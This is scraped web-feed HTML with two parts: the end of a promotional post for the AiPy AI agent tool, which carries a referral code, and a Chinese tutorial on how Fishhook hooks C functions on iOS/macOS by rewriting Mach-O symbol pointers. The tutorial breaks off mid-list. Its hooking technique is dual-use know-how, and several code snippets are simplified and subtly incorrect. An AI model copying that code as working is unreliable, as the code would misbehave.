<h2 data-id="heading-4">再来生成一份专业的黄金行情报告</h2>
<p>最近黄金行情波动大，我想做个深度了解。普通的 AI 往往会给你一堆“幻觉”数据（瞎编），但 AiPy 很清醒。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/567f89fb7f39460f9665ff3ea4e6bc95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=Oh5Jgiv55kQSO9kMzYL2aiRktdg%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p>它先写了个规划： 先调用免费 API 获取实时和历史数据 -&gt; 进行数据清洗 -&gt; 绘制图表 -&gt; 撰写分析。</p>
<p>最终，它不仅没瞎编，还用可视化的形式给我生成了一份非常专业的报告。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8caf5f1156074e0088bf3eb5a6683e49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=9Fvd1g%2FcIGWD1atRaTLWDqLwv8w%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68eff17c7c7b42b995fad29b89cddcf3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=XVEKJOIyhS8CxXszkrjlhfJCAms%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p>这种 “自行 Debug + 执行反馈循环” 的能力，让它越用越聪明。这种感觉不像是在用工具，更像是在带一个手脚利索的实习生。</p>
<h2 data-id="heading-5">谁最需要这个“数字牛马”？</h2>
<p>AiPy 官方甚至搞了一个“智能体集市”，里面有一堆现成的工种供你挑选。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df89443ccf5453e9204f9f9050dc11d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=pAE3xT%2F%2FJIELmCYuDIilN6rOj6g%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p>我觉得这几类人一定要试：</p>
<ul>
<li>杂事缠身的打工人： 天天处理大量文件、重命名、整理数据的。</li>
<li>开发者： 想快速搞个本地 AI 工具，又不想折腾环境的。</li>
<li>隐私敏感群体： 对数据安全要求极高，想在内网跑 AI 的。</li>
<li>想省钱的羊毛党： 不想给硅谷大厂交智商税，追求极致性价比的。</li>
</ul>
<h2 data-id="heading-6">写在最后</h2>
<p>有时候，AI 的价值不在于“它能写多美的诗”，而在于：它到底能替你少干多少脏活累活。</p>
<p>如果你厌倦了那种只会“纸上谈兵”的对话 AI，想真正感受一下全自动处理文件、操作软件的爽感，AiPy 绝对值得一试。它可能没 200 刀的 Claude 名气大，但它胜在：接地气、真干活、还免费。</p>
<hr/>
<p>想领白嫖福利的点这里： 注册时填我的邀请码：NQ6o，直接送 3500000 Tokens。别等了，赶紧去领你的专属牛马吧！</p>
<p>点击链接带你的数字小牛马回家吧：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aipyaipy.com%2F" target="_blank" title="https://www.aipyaipy.com/" ref="nofollow noopener noreferrer">www.aipyaipy.com/</a><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aipyaipy.com%2F" target="_blank" title="https://www.aipyaipy.com/" ref="nofollow noopener noreferrer">AiPy</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Fishhook原理深度剖析：从Mach-O到运行时函数Hook]]></title>    <link>https://juejin.cn/post/7596975035438792713</link>    <guid>https://juejin.cn/post/7596975035438792713</guid>    <pubDate>2026-01-20T04:07:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035438792713" data-draft-id="7596890557545971758" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Fishhook原理深度剖析：从Mach-O到运行时函数Hook"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2026-01-20T04:07:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sweet丶"/> <meta itemprop="url" content="https://juejin.cn/user/3227821869921646"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Fishhook原理深度剖析：从Mach-O到运行时函数Hook
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821869921646/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sweet丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T04:07:52.000Z" title="Tue Jan 20 2026 04:07:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    26
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在iOS/macOS开发中，函数Hook是一项强大的技术，它允许我们在运行时修改函数行为，广泛应用于调试、监控、性能分析等领域。Fishhook作为Facebook开源的一个轻量级Hook框架，其设计精巧、实现简洁，是理解macOS/iOS系统动态链接机制的绝佳案例。本文将深入剖析Fishhook的工作原理，解答一系列核心问题。</p>
<h2 data-id="heading-1">一、Fishhook是什么？</h2>
<p>Fishhook是一个基于动态链接特性的函数Hook库，专门针对macOS和iOS平台设计。它的核心思想是通过修改Mach-O文件中的符号绑定表来实现C函数的Hook。</p>
<p><strong>核心特点：</strong></p>
<ul>
<li>轻量级，仅几百行代码</li>
<li>专注于C函数Hook</li>
<li>基于合法的dyld API</li>
<li>主要用于调试和监控场景</li>
</ul>
<h2 data-id="heading-2">二、核心问题：Fishhook为什么只能Hook动态链接函数？</h2>
<h3 data-id="heading-3">1. Mach-O文件结构回顾</h3>
<p>要理解Fishhook的限制，首先要了解Mach-O文件结构：</p>
<pre><code class="hljs language-markdown" lang="markdown">Mach-O Header
Load Commands
<span class="hljs-bullet">    -</span> LC<span class="hljs-emphasis">_SEGMENT_</span>64
<span class="hljs-bullet">    -</span> LC<span class="hljs-emphasis">_SYMTAB (符号表)
    - LC_</span>DYSYMTAB (动态符号表)
<span class="hljs-bullet">    -</span> LC<span class="hljs-emphasis">_DYLD_</span>INFO (绑定信息)
Data
<span class="hljs-bullet">    -</span> <span class="hljs-strong">__TEXT (代码段，只读)
    - __</span>DATA (数据段，可写)
<span class="hljs-bullet">        -</span> <span class="hljs-strong">__la<span class="hljs-emphasis">_symbol_</span>ptr (惰性绑定指针)
        - __</span>nl<span class="hljs-emphasis">_symbol_</span>ptr (非惰性绑定指针)
<span class="hljs-bullet">        -</span> <span class="hljs-strong">__got (全局偏移表)
    - __</span>LINKEDIT (链接信息)
</code></pre>
<h3 data-id="heading-4">2. 动态链接 vs 静态链接</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 静态链接函数（无法Hook）</span>
<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">internal_function</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 编译时直接嵌入二进制</span>
    <span class="hljs-comment">// 调用方式：call 0x100000f00 (直接地址)</span>
}

<span class="hljs-comment">// 动态链接函数（可以Hook）</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span> {
    <span class="hljs-comment">// 来自libSystem.dylib</span>
    <span class="hljs-comment">// 调用方式：call [__la_symbol_ptr + offset] (间接寻址)</span>
}
</code></pre>
<p><strong>关键区别：</strong> 动态链接函数通过符号指针表间接调用，Fishhook正是通过修改这个指针表中的地址来实现Hook。</p>
<h3 data-id="heading-5">3. 为什么只能Hook系统库函数？</h3>
<p>这是一个常见的误解！<strong>Fishhook不仅可以Hook系统库函数，也可以Hook自定义动态库函数。</strong></p>
<pre><code class="hljs language-objective-c" lang="objective-c">// 自定义动态库中的函数也可以Hook
__attribute__((visibility("default")))
void my_dynamic_function() {
    // 这个函数可以被Fishhook Hook
}

// 只要满足以下条件：
// 1. 函数来自动态库（不是静态链接）
// 2. 函数具有外部可见性（不是static）
// 3. 函数通过符号表引用
</code></pre>
<h2 data-id="heading-6">三、符号绑定机制深度解析</h2>
<h3 data-id="heading-7">1. 惰性绑定（Lazy Binding） vs 非惰性绑定</h3>
<h4 data-id="heading-8"><strong>惰性绑定（__la_symbol_ptr）</strong></h4>
<pre><code class="hljs language-assembly" lang="assembly">; 第一次调用printf时的流程
call printf    ; 实际调用桩代码

; __stubs中的桩代码
___stub_printf:
    jmp *___la_symbol_ptr[0]   ; 第一次跳转到dyld_stub_binder

; 绑定后的状态
___la_symbol_ptr[0] = 0x7fff12345678 (真实printf地址)
</code></pre>
<h4 data-id="heading-9"><strong>非惰性绑定（__nl_symbol_ptr）</strong></h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 程序启动时立即绑定的函数</span>
<span class="hljs-comment">// 现代iOS/macOS中，__nl_symbol_ptr已较少使用</span>
<span class="hljs-comment">// 取而代之的是__got（全局偏移表）</span>

<span class="hljs-comment">// 使用__got的示例</span>
<span class="hljs-type">void</span> *function_ptr __attribute__((section(<span class="hljs-string">"__DATA,__got"</span>))) = &amp;some_function;
</code></pre>
<h4 data-id="heading-10"><strong>现代绑定机制变化</strong></h4>
<p>在现代 iOS/macOS 中，传统的 <code>__nl_symbol_ptr / __la_symbol_ptr</code> 的角色已被弱化，
编译器和 dyld 更多通过<code> GOT-like</code> 的间接寻址方式以及 <code>chained fixups</code> 机制来完成符号绑定；因此使用时需要注意是否能正确实现hook.</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 传统方式的缺点</span>
<span class="hljs-comment"># 1. 重定位表可能很大</span>
<span class="hljs-comment"># 2. 加载时需要大量随机内存访问</span>
<span class="hljs-comment"># 3. 不支持新硬件特性</span>
<span class="hljs-comment"># 4. 安全保护有限</span>

<span class="hljs-comment"># Chained Fixups 的优势</span>
<span class="hljs-comment"># 1. 更小的二进制大小（减少30-50%重定位数据）</span>
<span class="hljs-comment"># 2. 更快的启动速度</span>
<span class="hljs-comment"># 3. 支持指针认证（PAC）</span>
<span class="hljs-comment"># 4. 更好的安全性和性能</span>

// 寻址方式对比
<span class="hljs-comment">; 传统方式（x86_64）</span>
<span class="hljs-comment">; 通过 __la_symbol_ptr 调用 printf</span>
lea     rdi, <span class="hljs-section">[rip + format_string]</span>
call    qword ptr <span class="hljs-section">[rip + ___la_symbol_ptr_printf]</span>

<span class="hljs-comment">; __la_symbol_ptr 节区内容：</span>
___la_symbol_ptr_printf:
    .quad   ___dyld_stub_binder_printf

<span class="hljs-comment">; 现代方式（arm64）</span>
<span class="hljs-comment">; 通过 GOT-like 间接寻址</span>
adrp    x0, _printf@GOTPAGE     <span class="hljs-comment">; 获取 GOT 页</span>
ldr     x1, <span class="hljs-section">[x0, _printf@GOTPAGEOFF]</span> <span class="hljs-comment">; 从 GOT 加载地址</span>
blr     x1                      <span class="hljs-comment">; 间接跳转</span>

<span class="hljs-comment">; 实际上，编译器可能生成更优化的代码</span>
<span class="hljs-comment">; 直接使用 PC 相对寻址，不需要显式的 GOT 节区</span>
</code></pre>
<h3 data-id="heading-11">2. dyld_stub_binder的工作原理</h3>
<p>当第一次调用动态链接函数时，系统如何查找真实地址？</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// dyld_stub_binder的简化流程</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">dyld_stub_binder</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> lazy_binding_info_offset)</span> {
    <span class="hljs-comment">// 1. 从__LINKEDIT获取绑定信息</span>
    LazyBindingInfo *info = get_binding_info(offset);
    
    <span class="hljs-comment">// 2. 提取符号名和库序号</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *symbol_name = info-&gt;symbol_name;
    <span class="hljs-type">int</span> library_ordinal = info-&gt;library_ordinal;
    
    <span class="hljs-comment">// 3. 在指定动态库中查找符号</span>
    <span class="hljs-type">void</span> *address = find_symbol(symbol_name, library_ordinal);
    
    <span class="hljs-comment">// 4. 修改符号指针表</span>
    <span class="hljs-type">void</span> **symbol_ptr = info-&gt;symbol_pointer;
    *symbol_ptr = address;  <span class="hljs-comment">// 关键步骤！</span>
    
    <span class="hljs-comment">// 5. 跳转到目标函数</span>
    <span class="hljs-keyword">return</span> address;
}
</code></pre>
<h3 data-id="heading-12">3. ASLR（地址空间布局随机化）的影响</h3>
<p>ASLR是现代操作系统的安全特性，每次启动时系统模块的加载地址都随机变化：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 没有ASLR：</span>
<span class="hljs-comment">// printf地址固定为0x7fff12345678</span>

<span class="hljs-comment">// 有ASLR：</span>
<span class="hljs-comment">// 第一次启动：printf地址为0x7fff12345678</span>
<span class="hljs-comment">// 第二次启动：printf地址为0x7fff56789abc</span>
<span class="hljs-comment">// 第三次启动：printf地址为0x7fff9abcdef0</span>

<span class="hljs-comment">// Mach-O通过位置无关代码支持ASLR：</span>
<span class="hljs-comment">// 所有外部引用都通过指针表间接访问</span>
<span class="hljs-comment">// 指针表地址在运行时由dyld填充</span>
</code></pre>
<h2 data-id="heading-13">四、Fishhook的核心实现原理</h2>
<h3 data-id="heading-14">1. 核心数据结构：rebinding</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rebinding</span> {</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;      <span class="hljs-comment">// 要Hook的函数名</span>
    <span class="hljs-type">void</span> *replacement;     <span class="hljs-comment">// 替换函数的地址</span>
    <span class="hljs-type">void</span> **replaced;       <span class="hljs-comment">// 保存原始函数指针</span>
};
</code></pre>
<h3 data-id="heading-15">2. Fishhook的工作流程</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span> <span class="hljs-title function_">rebind_symbols</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> rebinding rebindings[], <span class="hljs-type">size_t</span> rebindings_nel)</span> {
    <span class="hljs-comment">// 1. 遍历所有镜像（动态库）</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _dyld_image_count(); i++) {
        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mach_header</span> *<span class="hljs-title">header</span> =</span> _dyld_get_image_header(i);
        
        <span class="hljs-comment">// 2. 查找__DATA段中的符号指针表</span>
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">segment_command</span> *<span class="hljs-title">seg</span> =</span> find_segment(header, <span class="hljs-string">"__DATA"</span>);
        <span class="hljs-keyword">if</span> (!seg) <span class="hljs-keyword">continue</span>;
        
        <span class="hljs-comment">// 3. 查找__la_symbol_ptr和__got节</span>
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">section</span> *<span class="hljs-title">la_section</span> =</span> find_section(seg, <span class="hljs-string">"__la_symbol_ptr"</span>);
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">section</span> *<span class="hljs-title">got_section</span> =</span> find_section(seg, <span class="hljs-string">"__got"</span>);
        
        <span class="hljs-comment">// 4. 处理每个符号指针</span>
        perform_rebinding_with_section(la_section, rebindings, rebindings_nel);
        perform_rebinding_with_section(got_section, rebindings, rebindings_nel);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-16">3. 关键函数：查找和替换符号</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">perform_rebinding_with_section</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> section *section,
                                          <span class="hljs-keyword">struct</span> rebinding rebindings[],
                                          <span class="hljs-type">size_t</span> rebindings_nel)</span> {
    <span class="hljs-comment">// 1. 获取间接符号表</span>
    <span class="hljs-type">uint32_t</span> *indirect_symbol_indices = indirect_symbol_table + section-&gt;reserved1;
    
    <span class="hljs-comment">// 2. 遍历符号指针表中的每个条目</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; section-&gt;size / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*); i++) {
        <span class="hljs-type">uint32_t</span> symtab_index = indirect_symbol_indices[i];
        
        <span class="hljs-comment">// 3. 在动态符号表中查找符号信息</span>
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nlist_64</span> *<span class="hljs-title">symbol</span> =</span> &amp;symtab[symtab_index];
        <span class="hljs-type">uint32_t</span> strtab_offset = symbol-&gt;n_un.n_strx;
        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *symbol_name = strtab + strtab_offset;
        
        <span class="hljs-comment">// 4. 检查是否是需要Hook的函数</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; rebindings_nel; j++) {
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(symbol_name, rebindings[j].name) == <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// 5. 找到目标！进行Hook</span>
                <span class="hljs-type">void</span> **symbol_ptr = (<span class="hljs-type">void</span>**)(section-&gt;addr + i * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*));
                
                <span class="hljs-comment">// 保存原始函数指针</span>
                <span class="hljs-keyword">if</span> (rebindings[j].replaced != <span class="hljs-literal">NULL</span>) {
                    *rebindings[j].replaced = *symbol_ptr;
                }
                
                <span class="hljs-comment">// 替换为新的函数地址</span>
                *symbol_ptr = rebindings[j].replacement;
                
                <span class="hljs-keyword">break</span>;
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-17">五、实际应用场景和限制</h2>
<h3 data-id="heading-18">1. 支持的函数类型</h3>



































<table><thead><tr><th>函数类型</th><th>是否支持</th><th>说明</th></tr></thead><tbody><tr><td>C函数（动态库）</td><td>✅ 完全支持</td><td>Fishhook的主要目标</td></tr><tr><td>Objective-C方法</td><td>❌ 不支持</td><td>使用Method Swizzling</td></tr><tr><td>Swift函数（@_cdecl）</td><td>✅ 条件支持</td><td>需要C接口导出</td></tr><tr><td>静态链接函数</td><td>❌ 不支持</td><td>编译时直接链接</td></tr><tr><td>内联函数</td><td>❌ 不支持</td><td>编译时展开</td></tr></tbody></table>
<h3 data-id="heading-19">2. iOS上的特殊限制</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// 在非越狱iOS设备上：
// ✅ 可以Hook自己的函数和系统公开API
// ❌ 不能Hook系统私有函数（受代码签名保护）

// 在越狱iOS设备上：
// ✅ 可以Hook所有函数

// 验证方法：
#include &lt;fishhook.h&gt;
#include &lt;stdio.h&gt;

// 可以Hook的系统公开函数
static int (*original_printf)(const char *, ...);

int hooked_printf(const char *format, ...) {
    // Hook实现
    return original_printf("[HOOKED] %s", format);
}

__attribute__((constructor))
static void setup_hook() {
    struct rebinding rebind = {"printf", hooked_printf, (void**)&amp;original_printf};
    rebind_symbols(&amp;rebind, 1);
}
</code></pre>
<h3 data-id="heading-20">3. 自定义动态库的Hook</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// MyDynamicFramework.framework
__attribute__((visibility("default")))
void framework_function() {
    NSLog(@"Original framework function");
}

// 主工程中的Hook
static void (*original_framework_func)() = NULL;

void hooked_framework_func() {
    NSLog(@"Before framework function");
    original_framework_func();
    NSLog(@"After framework function");
}

// 安装Hook
struct rebinding rebind = {
    "framework_function",
    hooked_framework_func,
    (void**)&amp;original_framework_func
};
rebind_symbols(&amp;rebind, 1);
</code></pre>
<h2 data-id="heading-21">六、与Method Swizzling的对比</h2>
<h3 data-id="heading-22">1. Fishhook（C函数Hook）</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 适用于C函数</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">hook_c_function</span><span class="hljs-params">()</span> {
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rebinding</span> <span class="hljs-title">rebind</span> =</span> {<span class="hljs-string">"printf"</span>, hooked_printf, &amp;original_printf};
    rebind_symbols(&amp;rebind, <span class="hljs-number">1</span>);
}
</code></pre>
<h3 data-id="heading-23">2. Method Swizzling（Objective-C方法Hook）</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// 适用于Objective-C方法
+ (void)hookObjectiveCMethod {
    Method original = class_getInstanceMethod([UIView class], @selector(setBackgroundColor:));
    Method swizzled = class_getInstanceMethod([self class], @selector(hooked_setBackgroundColor:));
    method_exchangeImplementations(original, swizzled);
}
</code></pre>
<h3 data-id="heading-24">3. 选择指南</h3>





























<table><thead><tr><th>场景</th><th>推荐技术</th></tr></thead><tbody><tr><td>Hook C系统函数</td><td>Fishhook</td></tr><tr><td>Hook C自定义函数</td><td>Fishhook</td></tr><tr><td>Hook Objective-C方法</td><td>Method Swizzling</td></tr><tr><td>Hook Swift方法</td><td>Method Swizzling（通过@objc暴露）</td></tr><tr><td>底层系统监控</td><td>Fishhook</td></tr></tbody></table>
<h2 data-id="heading-25">七、实战案例</h2>
<h3 data-id="heading-26">1. 性能监控</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// 监控内存分配
static void *(*original_malloc)(size_t);
static void (*original_free)(void *);

void *hooked_malloc(size_t size) {
    void *ptr = original_malloc(size);
    
    // 记录大内存分配
    if (size &gt; 1024 * 1024) {
        printf("[MEMORY] Large malloc: %zu bytes\n", size);
    }
    
    return ptr;
}

void hooked_free(void *ptr) {
    // 可以在这里添加内存释放监控
    original_free(ptr);
}
</code></pre>
<h2 data-id="heading-27">八、常见问题解答</h2>
<h3 data-id="heading-28">Q1: Fishhook能Hook静态库函数吗？</h3>
<p><strong>A:</strong> 取决于静态库的链接方式：</p>
<ul>
<li>如果静态库被完全复制到动态库中，可以Hook</li>
<li>如果静态库保持外部引用，需要在链接静态库的地方Hook</li>
<li>静态库的私有函数（static）无法Hook</li>
</ul>
<h3 data-id="heading-29">Q2: 为什么OC和Swift方法不能用Fishhook Hook？</h3>
<p><strong>A:</strong> Objective-C和Swift的方法调用机制完全不同：</p>
<ul>
<li>Objective-C使用消息发送机制（objc_msgSend）</li>
<li>Swift有自己的分发机制（虚函数表、直接调用等）</li>
<li>它们不通过符号绑定表调用，因此Fishhook无法修改</li>
</ul>
<h3 data-id="heading-30">Q3: Hook的时机是什么？</h3>
<p><strong>A:</strong> Fishhook可以在运行时任何时间点进行Hook，但最佳实践是：</p>
<pre><code class="hljs language-objective-c" lang="objective-c">// 1. 程序启动时（推荐）
__attribute__((constructor))
static void setup_hooks() {
    // 在main()函数之前执行
}

// 2. 运行时动态Hook
void dynamic_hook() {
    // 可以在需要时动态安装或移除Hook
}

// 3. 使用dispatch_once保证只Hook一次
static dispatch_once_t onceToken;
dispatch_once(&amp;onceToken, ^{
    // 安装Hook
});
</code></pre>
<h3 data-id="heading-31">Q4: 在MachOView中为什么看不到__nl_symbol_ptr？</h3>
<p><strong>A:</strong> 在现代iOS/macOS系统中：</p>
<ul>
